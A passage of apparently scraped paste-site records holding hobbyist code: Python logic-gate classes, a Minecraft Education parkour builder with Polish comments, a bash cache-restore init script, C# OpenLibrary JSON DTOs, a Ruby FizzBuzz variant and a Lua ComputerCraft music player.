+        self.and_gate.set_pins(self.pinA, self.pinB)
+        ##
+
+        sum = self.xor_gate.getOutput()
+        carry = self.and_gate.getOutput()
+
+        return sum, carry
+
+
+class BinaryGate(LogicGate):
+    pass
+
+class AndGate(BinaryGate):
+    pass
+
+"
+cjbDDyD0,Untitled,panupatchong,Python,Thursday 14th of March 2024 11:15:37 AM CDT,"class LogicGate:
+    def __init__(self, name):
+        self.name = name
+        self.pinA = None
+        self.pinB = None
+
+    def set_pins(self, pinA, pinB):
+        self.pinA = pinA
+        self.pinB = pinB
+
+
+class HalfAdder(LogicGate):
+    def __init__(self, name):
+        super().__init__(name)
+        self.xor_gate = XorGate(""xor1"")
+        self.and_gate = AndGate(""and1"")
+
+    def performGateLogic(self):
+        if self.pinA is None or self.pinB is None:
+            return ""Pins are not set. Cannot perform gate logic""
+        
+        self.xor_gate.set_pins(self.pinA, self.pinB)
+        self.and_gate.set_pins(self.pinA, self.pinB)
+
+        sum = self.xor_gate.getOutput()
+        carry = self.and_gate.getOutput()
+
+        return sum, carry"
+VPW5eSzP,Untitled,panupatchong,Python,Thursday 14th of March 2024 11:10:16 AM CDT,"class LogicGate:
+    def __init__(self, name):
+        self.name = name
+        self.pinA = None
+        self.pinB = None
+
+    def set_pins(self, pinA, pinB):
+        self.pinA = pinA
+        self.pinB = pinB
+
+
+class HalfAdder(LogicGate):
+    def __init__(self, name):
+        super().__init__(name)
+        self.xor_gate = XorGate(""xor1"")
+        self.and_gate = AndGate(""and1"")
+
+    def performGateLogic(self):
+        if self.pinA is None or self.pinB is None:
+            return None
+        self.xor_gate.set_pins(self.pinA, self.pinB)
+        self.and_gate.set_pins(self.pinA, self.pinB)
+
+        sum = self.xor_gate.getOutput()
+        carry = self.and_gate.getOutput()
+
+        return sum, carry"
+1cZqKf27,parkour,Repciu,Python,Thursday 14th of March 2024 10:46:52 AM CDT,"
+#aktualne miejsce odrodzenia gracza, zmienne w zależnośći od checkpointu, ktróy zaliczymy
+aktualnaPozycjaOdrodzenia=player.position()
+#zmienna pomocnicza dzięki niej dany etap będzie tworzony raz w ramach jednej rozgrywki
+czyEtap1=False
+czyEtap2=False
+czyEtap3=False
+czyEtap4=False
+
+
+
+#budujemy schody oraz pierwszą platformę ładującą etap 1
+def nowyParkour():
+    #teleportujemy konstrukotr w okolice gracza
+    builder.teleport_to(pos(5, 0, 0))
+    #obracamy
+    builder.face(EAST)
+    for i in range(70):
+        #konstruktor umieszcza blok schodów
+        builder.place(PURPUR_STAIRS)
+        #konstruktor przemieszcza się odpowiednio w przód,górę i lewo o podaną liczbę bloków
+        builder.shift(1, 1, 0)
+    #oznaczamy bieżącą pozycję konstruktora
+    builder.mark()
+    builder.shift(2, 0, -4)
+    #konstruktor wypełnia przestrzeń blokami od znaku(mark) do obecnej pozycji
+    builder.fill(DIAMOND_BLOCK)
+player.on_chat(""start"", nowyParkour)
+
+
+def smierc():
+    #dodajemy przerwę żeby poprawnie działało odradzanie gracza na platformie checkpoint
+    loops.pause(500)
+    player.teleport(aktualnaPozycjaOdrodzenia)
+player.on_died(smierc)
+
+
+def etap1i2(obrotKonstruktora,rodzajToru,rodzajCheckpoint):
+    #teleport konstruktora pod platformę i przesunięcie
+    builder.teleport_to(pos(1, -4, 0))
+    builder.mark()
+    builder.face(EAST)
+    for i in range(2):
+        for j in range(5):
+            #przesuwamy konstruktor
+            builder.move(FORWARD, randint(3, 8))
+            #tworzymy linie z danego bloku 
+            builder.line(rodzajToru)
+            #przesuwamy konstruktor w celu zrobienia przerwy pomiędzy blokami
+            builder.move(FORWARD, randint(2, 3))
+            #oznaczamy aktulaną pozycję żeby to od niej budowała się kolejna linia
+            builder.mark()
+            #obrót konstruktora
+        builder.turn(obrotKonstruktora)
+    builder.mark()
+    builder.shift(2, 0, -4)
+    builder.fill(rodzajCheckpoint)
+def etap3():
+    shapes.sphere(SLIME_BLOCK, pos(4, -30, 0), 1, ShapeOperation.REPLACE)
+
+    builder.teleport_to(pos(6, -32, 0))
+    builder.mark()
+    builder.face(EAST)
+    builder.set_origin()
+    builder.move(FORWARD, 65)
+    builder.line(NETHERRACK)
+
+    builder.move(FORWARD, 4)
+    builder.mark()
+    builder.shift(2,0,-4)
+    builder.fill(MOSS_STONE)
+
+    builder.teleport_to_origin()
+    builder.move(UP, 1)
+    for i in range(11):
+        builder.move(FORWARD, randint(3,8))
+        builder.place(FIRE)
+
+def etap4():
+    builder.move(DOWN, 30)
+    builder.face(SOUTH)
+    builder.move(FORWARD, 6)
+
+    builder.mark()
+    builder.shift(2,2,2)
+    builder.fill(BRICKS)
+    builder.shift(-1,0,-1)
+    builder.place(WATER)
+    builder.move(FORWARD, 4)
+    builder.set_origin()
+
+    while not (blocks.test_for_block(SEA_LANTERN, pos(0, -1, 0))):
+        builder.teleport_to_origin()
+        builder.face(SOUTH)
+
+        for i in range(30):
+            if not blocks.test_for_block(SEA_LANTERN, pos(0, -1, 0)):
+                builder.place(POLISHED_GRANITE)
+                builder.move(FORWARD, 1)
+                builder.move(UP, 1)
+                builder.turn(RIGHT_TURN)
+            else:
+                break
+        builder.mark()
+        builder.shift(-2,0,2)
+        builder.fill(SEA_LANTERN)
+        builder.teleport_to_origin()
+        builder.face(SOUTH)
+        loops.pause(8000)
+        for i in range(30):
+            if not blocks.test_for_block(SEA_LANTERN, pos(0, -1, 0)):
+                builder.place(MAGMA_BLOCK)
+                builder.move(FORWARD, 1)
+                builder.move(UP, 1)
+                builder.turn(RIGHT_TURN)
+                loops.pause(1000)
+            else:
+                break
+
+    player.execute('/clear')  
+    mobs.give(mobs.target(NEAREST_PLAYER), WATER_BUCKET, 5)
+
+#pętla sterująca ładowaniem etapów oraz system checkpoint
+while True:
+    if blocks.test_for_block(DIAMOND_BLOCK, pos(0, -1, 0)) and not czyEtap1:
+        #aktualizujemy pozycje gracza
+        aktualnaPozycjaOdrodzenia = player.position()
+        czyEtap1 = True
+        etap1i2(RIGHT_TURN,SLIME_BLOCK,GOLD_BLOCK)
+        
+
+    elif blocks.test_for_block(GOLD_BLOCK, pos(0, -1, 0)) and not czyEtap2:
+        aktualnaPozycjaOdrodzenia = player.position()
+        czyEtap2 = True
+        etap1i2(LEFT_TURN,MAGENTA_STAINED_GLASS_PANE,BEDROCK)
+        
+    elif blocks.test_for_block(BEDROCK, pos(0, -1, 0)) and not czyEtap3:
+        aktualnaPozycjaOdrodzenia = player.position()
+        czyEtap3 = True
+        etap3()
+
+    elif blocks.test_for_block(MOSS_STONE, pos(0, -1, 0)) and not czyEtap4:
+        aktualnaPozycjaOdrodzenia = player.position()     
+        czyEtap4 = True
+        etap4()  
+        "
+Bsnh4WBr,Untitled,iconoclasthero,Bash,Thursday 14th of March 2024 10:26:03 AM CDT,"pwd: /etc/init.d $ cat restorecache 
+#!/bin/bash
+### BEGIN INIT INFO
+# Provides:          restorecache
+# Required-Start:
+# Required-Stop:
+# Default-Start:     3 5
+# Default-Stop:
+# Description:       restores the cache backup to ram cache location
+### END INIT INFO
+
+cacheroot=/dev/shm
+cachedir=/dev/shm/cache
+backdir=/library/backup
+cacheuser=redacted
+cachegroup=media
+
+shopt -s extglob
+start=""$(date +%s)""
+
+function editscript(){
+  scriptname=$(realpath ""$0"" 2>/dev/null)
+  local script path; script=""${scriptname##*/}""; path=""${scriptname%/*}""; swp=""$path/.$script.swp""
+     if [[ ! -e ""$swp"" ]]; then printf ""\n\n%s\n\n"" ""$swp""; (/usr/bin/nano ""$scriptname""); exit
+     else printf ""\n%s is already being edited.\n%s exists; try fg or look in another window.\n"" ""$scriptname"" ""$swp""; exit;
+  fi; }
+
+function pause(){ read -p ""$*"" ; }
+
+[[ ""$1"" == @(edit|e|nano) ]] && editscript
+
+#[[ ! -d ""$cachedir"" ]] && cp -rp ""$backdir$cachedir""/* ""$cachedir""
+#[[ ! -d ""$cachedir"" ]] && rsync -avz ""$backdir$cachedir"" ""$cacheroot""
+#[[ $(diff ""$cachedir"" ""$backdir$cachedir"" -rq) ]] && rsync -avz ""$backdir$cachedir"" ""$cacheroot""
+#[[ $(diff /dev/shm/cache/ /library/backup/dev/shm/cache/ -rq) ]] && cp -rp ""$backdir$cachedir"" ""$cacheroot""
+
+rsync -avz ""$backdir$cachedir"" ""$cacheroot""
+
+[[ ! -d ""$cachedir"" ]] && mkdir ""$cachedir"" && chown ""$cacheuser"":""cachegroup"" ""$cachedir""
+[[ ! $(stat /cache/ -c %U) == ""$cacheuser"" ]] && chown ""$cacheuser"" ""$cachedir""
+[[ ! $(stat /cache/ -c %G) == ""$cachegroup"" ]] && chgrp ""$cachgroup"" ""$cachedir""
+"
+hRyZvvxh,Untitled,KristianIvanov00,C#,Thursday 14th of March 2024 10:20:23 AM CDT,"namespace Bookstore.Services.External
+{
+    using System;
+    using System.Collections.Generic;
+
+    using System.Globalization;
+    using Newtonsoft.Json;
+    using Newtonsoft.Json.Converters;
+
+    public partial class OpenLibraryBookDto
+    {
+        [JsonProperty(""url"")]
+        public Uri Url { get; set; }
+
+        [JsonProperty(""key"")]
+        public string Key { get; set; }
+
+        [JsonProperty(""title"")]
+        public string Title { get; set; }
+
+        [JsonProperty(""subtitle"")]
+        public string Subtitle { get; set; }
+
+        [JsonProperty(""authors"")]
+        public List<Author> Authors { get; set; }
+
+        [JsonProperty(""number_of_pages"")]
+        public long NumberOfPages { get; set; }
+
+        [JsonProperty(""pagination"")]
+        public string Pagination { get; set; }
+
+        [JsonProperty(""by_statement"")]
+        public string ByStatement { get; set; }
+
+        [JsonProperty(""identifiers"")]
+        public Dictionary<string, List<string>> Identifiers { get; set; }
+
+        [JsonProperty(""classifications"")]
+        public Classifications Classifications { get; set; }
+
+        [JsonProperty(""publishers"")]
+        public List<Publish> Publishers { get; set; }
+
+        [JsonProperty(""publish_places"")]
+        public List<Publish> PublishPlaces { get; set; }
+
+        [JsonProperty(""publish_date"")]
+        [JsonConverter(typeof(ParseStringConverter))]
+        public long PublishDate { get; set; }
+
+        [JsonProperty(""subjects"")]
+        public List<Author> Subjects { get; set; }
+
+        [JsonProperty(""notes"")]
+        public string Notes { get; set; }
+
+        [JsonProperty(""ebooks"")]
+        public List<Ebook> Ebooks { get; set; }
+
+        [JsonProperty(""cover"")]
+        public Cover Cover { get; set; }
+    }
+
+    public partial class Author
+    {
+        [JsonProperty(""url"")]
+        public Uri Url { get; set; }
+
+        [JsonProperty(""name"")]
+        public string Name { get; set; }
+    }
+
+    public partial class Classifications
+    {
+        [JsonProperty(""lc_classifications"")]
+        public List<string> LcClassifications { get; set; }
+
+        [JsonProperty(""dewey_decimal_class"")]
+        public List<string> DeweyDecimalClass { get; set; }
+    }
+
+    public partial class Cover
+    {
+        [JsonProperty(""small"")]
+        public Uri Small { get; set; }
+
+        [JsonProperty(""medium"")]
+        public Uri Medium { get; set; }
+
+        [JsonProperty(""large"")]
+        public Uri Large { get; set; }
+    }
+
+    public partial class Ebook
+    {
+        [JsonProperty(""preview_url"")]
+        public Uri PreviewUrl { get; set; }
+
+        [JsonProperty(""availability"")]
+        public string Availability { get; set; }
+
+        [JsonProperty(""formats"")]
+        public Formats Formats { get; set; }
+
+        [JsonProperty(""borrow_url"")]
+        public Uri BorrowUrl { get; set; }
+
+        [JsonProperty(""checkedout"")]
+        public bool Checkedout { get; set; }
+    }
+
+    public partial class Formats
+    {
+    }
+
+    public partial class Publish
+    {
+        [JsonProperty(""name"")]
+        public string Name { get; set; }
+    }
+
+    public partial class OpenLibraryBookDto
+    {
+        public static OpenLibraryBookDto FromJson(string json) => JsonConvert.DeserializeObject<OpenLibraryBookDto>(json, Bookstore.Services.External.Converter.Settings);
+    }
+
+    public static class Serialize
+    {
+        public static string ToJson(this OpenLibraryBookDto self) => JsonConvert.SerializeObject(self, Bookstore.Services.External.Converter.Settings);
+    }
+
+    internal static class Converter
+    {
+        public static readonly JsonSerializerSettings Settings = new JsonSerializerSettings
+        {
+            MetadataPropertyHandling = MetadataPropertyHandling.Ignore,
+            DateParseHandling = DateParseHandling.None,
+            Converters =
+            {
+                new IsoDateTimeConverter { DateTimeStyles = DateTimeStyles.AssumeUniversal }
+            },
+        };
+    }
+
+    internal class ParseStringConverter : JsonConverter
+    {
+        public override bool CanConvert(Type t) => t == typeof(long) || t == typeof(long?);
+
+        public override object ReadJson(JsonReader reader, Type t, object existingValue, JsonSerializer serializer)
+        {
+            if (reader.TokenType == JsonToken.Null) return null;
+            var value = serializer.Deserialize<string>(reader);
+            long l;
+            if (Int64.TryParse(value, out l))
+            {
+                return l;
+            }
+            throw new Exception(""Cannot unmarshal type long"");
+        }
+
+        public override void WriteJson(JsonWriter writer, object untypedValue, JsonSerializer serializer)
+        {
+            if (untypedValue == null)
+            {
+                serializer.Serialize(writer, null);
+                return;
+            }
+            var value = (long)untypedValue;
+            serializer.Serialize(writer, value.ToString());
+            return;
+        }
+
+        public static readonly ParseStringConverter Singleton = new ParseStringConverter();
+    }
+}
+"
+NUdZev8C,talent_pipe,WagnerMatosUK,Ruby,Thursday 14th of March 2024 10:11:41 AM CDT,"def print_numbers
+  (1..100).each do |i|
+    if i % 3 == 0 && i % 5 == 0
+      puts 'APingBPong'
+    elsif i % 3 == 0
+      puts 'APing'
+    elsif i % 5 == 0
+      puts 'BPong'
+    else
+      puts i
+    end
+  end
+end
+
+def print_numbers
+  (1..100).each do |i|
+    output = ''
+    output += 'APing' if i % 3 == 0
+    output += 'BPong' if i % 5 == 0
+    puts(output.empty? ? i : output)
+  end
+end"
+SfQwR46n,Updated CC music player,NewkoWasHere,Lua,Thursday 14th of March 2024 10:09:32 AM CDT,"--[[
+wave-amp version 1.0.0
+
+The MIT License (MIT)
+Copyright (c) 2016 CrazedProgrammer
+
+Permission is hereby granted, free of charge, to any person obtaining a copy of this software and
+associated documentation files (the ""Software""), to deal in the Software without restriction,
+including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense,
+and/or sell copies of the Software, and to permit persons to whom the Software is furnished to do
+so, subject to the following conditions:
+
+The above copyright notice and this permission notice shall be included in all copies or
+substantial portions of the Software.
+
+THE SOFTWARE IS PROVIDED ""AS IS"", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED,
+INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A
+PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR
+COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN
+AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION
+WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
+]]
+
+--[[
+wave version 0.1.4
+
+The MIT License (MIT)
+Copyright (c) 2016 CrazedProgrammer
+
+Permission is hereby granted, free of charge, to any person obtaining a copy of this software and
+associated documentation files (the ""Software""), to deal in the Software without restriction,
+including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense,
+and/or sell copies of the Software, and to permit persons to whom the Software is furnished to do
+so, subject to the following conditions:
+
+The above copyright notice and this permission notice shall be included in all copies or
+substantial portions of the Software.
+
+THE SOFTWARE IS PROVIDED ""AS IS"", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED,
+INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A
+PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR
+COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN
+AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION
+WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
+]]
+
+local wave = { }
+wave.version = ""0.1.4""
+
+wave._oldSoundMap = {""harp"", ""bass"", ""basedrum"", ""snare"", ""hat""}
+wave._newSoundMap = {""block.harp"", ""block.harp"", ""block.basedrum"", ""block.snare"", ""block.hat""}
+wave._defaultThrottle = 99
+wave._defaultClipMode = 1
+wave._maxInterval = 1
+wave._isNewSystem = false
+if _HOST then
+	wave._isNewSystem = _HOST:sub(15, #_HOST) >= ""1.80""
+end
+
+wave.context = { }
+wave.output = { }
+wave.track = { }
+wave.instance = { }
+
+function wave.createContext(clock, volume)
+	clock = clock or os.clock()
+	volume = volume or 1.0
+
+	local context = setmetatable({ }, {__index = wave.context})
+	context.outputs = { }
+	context.instances = { }
+	context.vs = {0, 0, 0, 0, 0}
+	context.prevClock = clock
+	context.volume = volume
+	return context
+end
+
+function wave.context:addOutput(...)
+	local output = wave.createOutput(...)
+	self.outputs[#self.outputs + 1] = output
+	return output
+end
+
+function wave.context:addOutputs(...)
+	local outs = {...}
+	if #outs == 1 then
+		if not getmetatable(outs) then
+			outs = outs[1]
+		else
+			if getmetatable(outs).__index ~= wave.outputs then
+				outs = outs[1]
+			end
+		end
+	end
+	for i = 1, #outs do
+		self:addOutput(outs[i])
+	end
+end
+
+function wave.context:removeOutput(out)
+	if type(out) == ""number"" then
+		table.remove(self.outputs, out)
+		return
+	elseif type(out) == ""table"" then
+		if getmetatable(out).__index == wave.output then
+			for i = 1, #self.outputs do
+				if out == self.outputs[i] then
+					table.remove(self.outputs, i)
+					return
+				end
+			end
+			return
+		end
+	end
+	for i = 1, #self.outputs do
+		if out == self.outputs[i].native then
+			table.remove(self.outputs, i)
+			return
+		end
+	end
+end
+
+function wave.context:addInstance(...)
+	local instance = wave.createInstance(...)
+	self.instances[#self.instances + 1] = instance
+	return instance
+end
+
+function wave.context:removeInstance(instance)
+	if type(instance) == ""number"" then
+		table.remove(self.instances, instance)
+	else
+		for i = 1, #self.instances do
+			if self.instances == instance then
+				table.remove(self.instances, i)
+				return
+			end
+		end
+	end
+end
+
+function wave.context:playNote(note, pitch, volume)
+	volume = volume or 1.0
+
+	self.vs[note] = self.vs[note] + volume
+	for i = 1, #self.outputs do
+		self.outputs[i]:playNote(note, pitch, volume * self.volume)
+	end
+end
+
+function wave.context:update(interval)
+	local clock = os.clock()
+	interval = interval or (clock - self.prevClock)
+
+	self.prevClock = clock
+	if interval > wave._maxInterval then
+		interval = wave._maxInterval
+	end
+	for i = 1, #self.outputs do
+		self.outputs[i].notes = 0
+	end
+	for i = 1, 5 do
+		self.vs[i] = 0
+	end
+	if interval > 0 then
+		for i = 1, #self.instances do
+			local notes = self.instances[i]:update(interval)
+			for j = 1, #notes / 3 do
+				self:playNote(notes[j * 3 - 2], notes[j * 3 - 1], notes[j * 3])
+			end
+		end
+	end
+end
+
+
+
+function wave.createOutput(out, volume, filter, throttle, clipMode)
+	volume = volume or 1.0
+	filter = filter or {true, true, true, true, true}
+	throttle = throttle or wave._defaultThrottle
+	clipMode = clipMode or wave._defaultClipMode
+	local output = setmetatable({ }, {__index = wave.output})
+	output.native = out
+	output.volume = volume
+	output.filter = filter
+	output.notes = 0
+	output.throttle = throttle
+	output.clipMode = clipMode
+	if type(out) == ""function"" then
+		output.nativePlayNote = out
+		output.type = ""custom""
+		return output
+	elseif type(out) == ""string"" then
+		if peripheral.getType(out) == ""speaker"" then
+			
+				local nb = peripheral.wrap(out)
+				output.type = ""speaker""
+				function output.nativePlayNote(note, pitch, volume)
+					if output.volume * volume > 0 then
+						nb.playNote(wave._oldSoundMap[note],volume,pitch)
+					end
+				end
+				return output
+			
+		end
+	elseif type(out) == ""table"" then
+		if out.execAsync then
+			output.type = ""commands""
+			if wave._isNewSystem then
+				function output.nativePlayNote(note, pitch, volume)
+					out.execAsync(""/playsound minecraft:block.note_""..wave._newSoundMap[note].."" record @a ~ ~ ~ ""..tostring(volume).."" ""..tostring(math.pow(2, (pitch - 12) / 12)))
+				end
+			else
+				function output.nativePlayNote(note, pitch, volume)
+					out.execAsync(""/playsound minecraft:block.note_""..wave._newSoundMap[note].."" record @a ~ ~ ~ ""..tostring(volume).."" ""..tostring(2^((pitch-12)/12)))
+				end
+			end
+			return output
+		elseif getmetatable(out) then
+			if getmetatable(out).__index == wave.output then
+				return out
+			end
+		end
+	end
+end
+
+function wave.scanOutputs()
+	local outs = { }
+	if commands then
+		outs[#outs + 1] = wave.createOutput(commands)
+	end
+	local sides = peripheral.getNames()
+	for i = 1, #sides do
+		if peripheral.getType(sides[i]) == ""speaker"" then
+			outs[#outs + 1] = wave.createOutput(sides[i])
+		end
+	end
+	return outs
+end
+
+function wave.output:playNote(note, pitch, volume)
+	volume = volume or 1.0
+
+	if self.clipMode == 1 then
+		if pitch < 0 then
+			pitch = 0
+		elseif pitch > 24 then
+			pitch = 24
+		end
+	elseif self.clipMode == 2 then
+		if pitch < 0 then
+			while pitch < 0 do
+				pitch = pitch + 12
+			end
+		elseif pitch > 24 then
+			while pitch > 24 do
+				pitch = pitch - 12
+			end
+		end
+	end
+	if self.filter[note] and self.notes < self.throttle then
+		self.nativePlayNote(note, pitch, volume * self.volume)
+		self.notes = self.notes + 1
+	end
+end
+
+
+
+function wave.loadTrack(path)
+	local track = setmetatable({ }, {__index = wave.track})
+	local handle = fs.open(path, ""rb"")
+	if not handle then return end
+
+	local function readInt(size)
+		local num = 0
+		for i = 0, size - 1 do
+			local byte = handle.read()
+			if not byte then -- dont leave open file handles no matter what
+				handle.close()
+				return
+			end
+			num = num + byte * (256 ^ i)
+		end
+		return num
+	end
+	local function readStr()
+		local length = readInt(4)
+		if not length then return end
+		local data = { }
+		for i = 1, length do
+			data[i] = string.char(handle.read())
+		end
+		return table.concat(data)
+	end
+
+	-- Part #1: Metadata
+	track.length = readInt(2) -- song length (ticks)
+	track.height = readInt(2) -- song height
+	track.name = readStr() -- song name
+	track.author = readStr() -- song author
+	track.originalAuthor = readStr() -- original song author
+	track.description = readStr() -- song description
+	track.tempo = readInt(2) / 100 -- tempo (ticks per second)
+	track.autoSaving = readInt(1) == 0 and true or false -- auto-saving
+	track.autoSavingDuration = readInt(1) -- auto-saving duration
+	track.timeSignature = readInt(1) -- time signature (3 = 3/4)
+	track.minutesSpent = readInt(4) -- minutes spent
+	track.leftClicks = readInt(4) -- left clicks
+	track.rightClicks = readInt(4) -- right clicks
+	track.blocksAdded = readInt(4) -- blocks added
+	track.blocksRemoved = readInt(4) -- blocks removed
+	track.schematicFileName = readStr() -- midi/schematic file name
+
+	-- Part #2: Notes
+	track.layers = { }
+	for i = 1, track.height do
+		track.layers[i] = {name = ""Layer ""..i, volume = 1.0}
+		track.layers[i].notes = { }
+	end
+
+	local tick = 0
+	while true do
+		local tickJumps = readInt(2)
+		if tickJumps == 0 then break end
+		tick = tick + tickJumps
+		local layer = 0
+		while true do
+			local layerJumps = readInt(2)
+			if layerJumps == 0 then break end
+			layer = layer + layerJumps
+			if layer > track.height then -- nbs can be buggy
+				for i = track.height + 1, layer do
+					track.layers[i] = {name = ""Layer ""..i, volume = 1.0}
+					track.layers[i].notes = { }
+				end
+				track.height = layer
+			end
+			local instrument = readInt(1)
+			local key = readInt(1)
+			if instrument <= 4 then -- nbs can be buggy
+				track.layers[layer].notes[tick * 2 - 1] = instrument + 1
+				track.layers[layer].notes[tick * 2] = key - 33
+			end
+		end
+	end
+
+	-- Part #3: Layers
+	for i = 1, track.height do
+		local name = readStr()
+		if not name then break end -- if layer data doesnt exist, abort
+		track.layers[i].name = name
+		track.layers[i].volume = readInt(1) / 100
+	end
+
+	handle.close()
+	return track
+end
+
+
+
+function wave.createInstance(track, volume, playing, loop)
+	volume = volume or 1.0
+	playing = (playing == nil) or playing
+	loop = (loop ~=  nil) and loop
+
+	if getmetatable(track).__index == wave.instance then
+		return track
+	end
+	local instance = setmetatable({ }, {__index = wave.instance})
+	instance.track = track
+	instance.volume = volume or 1.0
+	instance.playing = playing
+	instance.loop = loop
+	instance.tick = 1
+	return instance
+end 
+
+function wave.instance:update(interval)
+	local notes = { }
+	if self.playing then
+		local dticks = interval * self.track.tempo
+		local starttick = self.tick
+		local endtick = starttick + dticks
+		local istarttick = math.ceil(starttick)
+		local iendtick = math.ceil(endtick) - 1
+		for i = istarttick, iendtick do
+			for j = 1, self.track.height do
+				if self.track.layers[j].notes[i * 2 - 1] then
+					notes[#notes + 1] = self.track.layers[j].notes[i * 2 - 1]
+					notes[#notes + 1] = self.track.layers[j].notes[i * 2]
+					notes[#notes + 1] = self.track.layers[j].volume
+				end
+			end
+		end
+		self.tick = self.tick + dticks
+
+		if endtick > self.track.length then
+			self.tick = 1
+			self.playing = self.loop
+		end
+	end
+	return notes
+end
+
+
+
+local cmdHelp = [[
+-l                   lists all outputs connected to the computer.
+-c <config file>     loads the parameters from a file.
+parameters are separated by newlines.
+-t <theme file>      loads the theme from a file.
+-f <filter[:second]> sets the note filter for the outputs.
+examples:
+ -f 10111            sets the filter for all outputs to remove the bass instrument.
+ -f 10011:01100      sets the filter so the bass and basedrum instruments only come out of the second output
+-v <volume[:second]> sets the volume for the outputs.
+--nrm --stp --rep --shf   sets the play mode.
+--noui --noinput     disables the ui/keyboard input]]
+
+
+local trackMode = 1
+-- 1 = normal (go to next song on finish)
+-- 2 = stop (stop on finish)
+-- 3 = repeat (restart song on finish)
+-- 4 = shuffle (go to random song on finish)
+
+local files = { }
+local tracks = { }
+local context, track, instance
+
+-- ui stuff
+local noUI = false
+local noInput = false
+local screenWidth, screenHeight = term.getSize()
+local trackScroll = 0
+local currentTrack = 1
+local vsEasings = {0, 0, 0, 0, 0}
+local vsStep = 5
+local vsDecline = 0.25
+
+-- theme
+local theme = term.isColor() and 
+{
+	topBar = colors.lime,
+	topBarTitle = colors.white,
+	topBarOption = colors.white,
+	topBarOptionSelected = colors.lightGray,
+	topBarClose = colors.white,
+	song = colors.black,
+	songBackground = colors.white,
+	songSelected = colors.black,
+	songSelectedBackground = colors.lightGray,
+	scrollBackground = colors.lightGray,
+	scrollBar = colors.gray,
+	scrollButton = colors.black,
+	visualiserBar = colors.lime,
+	visualiserBackground = colors.green,
+	progressTime = colors.white,
+	progressBackground = colors.lightGray,
+	progressLine = colors.gray,
+	progressNub = colors.gray,
+	progressNubBackground = colors.gray,
+	progressNubChar = ""="",
+	progressButton = colors.white
+}
+or
+{
+	topBar = colors.lightGray,
+	topBarTitle = colors.white,
+	topBarOption = colors.white,
+	topBarOptionSelected = colors.gray,
+	topBarClose = colors.white,
+	song = colors.black,
+	songBackground = colors.white,
+	songSelected = colors.black,
+	songSelectedBackground = colors.lightGray,
+	scrollBackground = colors.lightGray,
+	scrollBar = colors.gray,
+	scrollButton = colors.black,
+	visualiserBar = colors.black,
+	visualiserBackground = colors.gray,
+	progressTime = colors.white,
+	progressBackground = colors.lightGray,
+	progressLine = colors.gray,
+	progressNub = colors.gray,
+	progressNubBackground = colors.gray,
+	progressNubChar = ""="",
+	progressButton = colors.white
+}
+
+local running = true
+
+
+
+local function addFiles(path)
+	local dirstack = {path}
+	while #dirstack > 0 do
+		local dir = dirstack[1]
+		table.remove(dirstack, 1)
+		if dir ~= ""rom"" then
+			for _, v in pairs(fs.list(dir)) do
+				local path = (dir == """") and v or dir..""/""..v
+				if fs.isDir(path) then
+					dirstack[#dirstack + 1] = path
+				elseif path:sub(#path - 3, #path) == "".nbs"" then
+					files[#files + 1] = path
+				end
+			end
+		end
+	end
+end
+
+local function init(args)
+	local volumes = { }
+	local filters = { }
+	local outputs = wave.scanOutputs()
+	local timestamp = 0
+	if #outputs == 0 then
+		error(""no outputs found"")
+	end
+
+	local i, argtype = 1
+	while i <= #args do
+		if not argtype then
+			if args[i] == ""-h"" then
+				print(cmdHelp)
+				noUI = true
+				running = false
+				return
+			elseif args[i] == ""-c"" or args[i] == ""-v"" or args[i] == ""-f"" or args[i] == ""-t"" then
+				argtype = args[i]
+			elseif args[i] == ""-l"" then
+				print(#outputs.."" outputs detected:"")
+				for i = 1, #outputs do
+					print(i.."":"", outputs[i].type, type(outputs[i].native) == ""string"" and outputs[i].native or """")
+				end
+				noUI = true
+				running = false
+				return
+			elseif args[i] == ""--noui"" then
+				noUI = true
+			elseif args[i] == ""--noinput"" then
+				noInput = true
+			elseif args[i] == ""--nrm"" then
+				trackMode = 1
+			elseif args[i] == ""--stp"" then
+				trackMode = 2
+			elseif args[i] == ""--rep"" then
+				trackMode = 3
+			elseif args[i] == ""--shf"" then
+				trackMode = 4
+			else
+				local path = shell.resolve(args[i])
+				if fs.isDir(path) then
+					addFiles(path)
+				elseif fs.exists(path) then
+					files[#files + 1] = path
+				end
+			end
+		else
+			if argtype == ""-c"" then
+				local path = shell.resolve(args[i])
+				local handle = fs.open(path, ""r"")
+				if not handle then
+					error(""config file does not exist: ""..path)
+				end
+				local line = handle.readLine()
+				while line do
+					args[#args + 1] = line
+					line = handle.readLine()
+				end
+				handle.close()
+			elseif argtype == ""-t"" then
+				local path = shell.resolve(args[i])
+				local handle = fs.open(path, ""r"")
+				if not handle then
+					error(""theme file does not exist: ""..path)
+				end
+				local data = handle.readAll()
+				handle.close()
+				for k, v in pairs(colors) do
+					data = data:gsub(""colors.""..k, tostring(v))
+				end
+				for k, v in pairs(colours) do
+					data = data:gsub(""colours.""..k, tostring(v))
+				end
+				local newtheme = textutils.unserialize(data)
+				for k, v in pairs(newtheme) do
+					theme[k] = v
+				end
+			elseif argtype == ""-v"" then
+				for str in args[i]:gmatch(""([^:]+)"") do
+					local vol = tonumber(str)
+					if vol then
+						if vol >= 0 and vol <= 1 then
+							volumes[#volumes + 1] = vol
+						else
+							error(""invalid volume value: ""..str)
+						end
+					else
+						error(""invalid volume value: ""..str)
+					end
+				end
+			elseif argtype == ""-f"" then
+				for str in args[i]:gmatch(""([^:]+)"") do
+					if #str == 5 then
+						local filter = { }
+						for i = 1, 5 do
